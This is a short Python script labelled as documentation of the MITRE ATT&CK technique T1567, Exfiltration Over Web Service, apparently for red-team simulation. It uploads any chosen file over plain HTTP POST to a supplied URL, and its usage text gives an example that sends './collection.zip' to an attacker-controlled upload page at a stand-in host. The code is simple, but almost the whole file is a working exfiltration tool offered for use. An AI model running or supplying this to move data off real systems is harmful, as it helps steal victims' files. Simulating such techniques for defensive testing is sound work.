# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
#T1567 - Exfiltration Over Web Service
# Objective: Exfiltrate data over an unencrypted web channel (HTTP).
# This script uploads a file from the attacker's machine to a web server using a POST request.
# This simulates the final step of getting data out.

#!/usr/bin/env python3
import sys
import requests

def exfil_over_http(file_to_exfil, upload_url):
    try:
        print(f"[*] Exfiltrating {file_to_exfil} to {upload_url}...")
        
        with open(file_to_exfil, 'rb') as f:
            files = {'file': (file_to_exfil, f)}
            response = requests.post(upload_url, files=files, timeout=10)
        
        response.raise_for_status() # Raise an exception for bad status codes
        
        print(f"[+] File exfiltrated successfully. Server responded with: {response.status_code}")
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during exfiltration: {e}")
    except FileNotFoundError:
        print(f"[-] Error: File not found at {file_to_exfil}")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: ./T1567_exfil_http.py <file_to_exfil> <upload_url>")
        print("Example: ./T1567_exfil_http.py ./collection.zip http://attacker.com/upload.php")
        sys.exit(1)

    exfil_over_http(sys.argv[1], sys.argv[2])